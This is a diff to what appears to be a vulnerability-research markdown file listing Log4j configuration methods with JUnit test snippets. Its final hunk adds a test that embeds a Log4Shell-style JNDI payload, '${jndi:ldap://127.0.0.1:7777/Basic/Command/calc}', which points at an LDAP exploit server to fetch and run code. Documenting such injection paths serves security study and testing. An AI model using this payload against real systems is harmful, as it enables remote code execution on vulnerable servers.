@@ -180,7 +180,7 @@ implementation("com.fasterxml.jackson.core:jackson-databind:2.17.0")
     }
 ```
 
-**YamlConfigurationFactory.getConfiguration**
+**YamlConfigurationFactory.getConfiguration()**
 
 Required dedpendecies
 ```
@@ -200,7 +200,7 @@ implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1"
     }
 ```
 
-**LoggerContextAdminMBean.setConfigLocationUri**
+**LoggerContextAdminMBean.setConfigLocationUri()**
 
 ```
     @Test
@@ -214,5 +214,16 @@ implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1"
         });
         URI newConfigUri = new File("config.json").toURI();
         mBean.setConfigLocationUri(newConfigUri.toString());
+    }
+```
+
+**CompositeConfiguration.reconfigure()**
+```
+ @Test
+    public void reconfigureCompositeConfigurationTest() throws Exception {
+        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
+        AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
+        CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
+        compositeConfig.reconfigure();
     }
 ```
